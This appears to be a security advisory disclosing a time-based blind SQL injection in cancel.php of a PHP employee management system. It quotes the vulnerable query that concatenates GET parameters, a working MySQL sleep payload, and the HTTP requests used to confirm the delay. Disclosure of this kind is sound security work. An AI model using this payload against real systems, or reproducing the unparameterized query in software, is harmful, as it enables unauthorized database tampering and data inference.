## EMPLOYEE_MANAGEMENT_SYSTEM file `370project/cancel.php` contains a SQL Injection (time-based blind) vulnerability

Impact of the vulnerability
User-controlled parameters are concatenated into an SQL `UPDATE` statement without parameterization. This may allow an attacker to:

- Manipulate leave-request status (unauthorized cancellation, depending on DB behavior/permissions)
- Infer database behavior/data via blind techniques
- Degrade availability by triggering time-delay or expensive database operations

### Payload:

(select*from(select+sleep(10)union/**/select+1)a)

```
(select*from(select+sleep(10)union/**/select+1)a)
```

### POC:

The vulnerable endpoint is `GET /cancel.php?id=...&token=...`. Both `id` and `token` are used directly in SQL:

$id = $_GET['id'];

$token = $_GET['token'];

$result = mysqli_query($conn, "UPDATE `employee_leave` SET `status`='Cancelled' WHERE `id`=$id and `token` = $token");

header("Location:empleave.php");

- Baseline request (normal response time; returns a redirect):

GET /cancel.php?id=1&token=307 HTTP/1.1

Host: 370project:82

Accept: text/html

Connection: close

- Time-delay verification request (use a URL-encoded time-delay expression in an authorized test environment; returns a redirect after the SQL executes):

GET /cancel.php?id=<URL_ENCODED_TIME_DELAY_PAYLOAD>&token=307 HTTP/1.1

Host: 370project:82

Accept: text/html

Connection: close

Expected result:
Compared to the baseline, the verification request responds approximately `10` slower, then returns `302 Found` with `Location: empleave.php`, indicating the injected expression was executed during the SQL `UPDATE`.

### Sources download:

https://code-projects.org/employee-management-system-in-php-with-source-code/

```
https://code-projects.org/employee-management-system-in-php-with-source-code/
```



![image-20260409151433512](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260409151433512.png)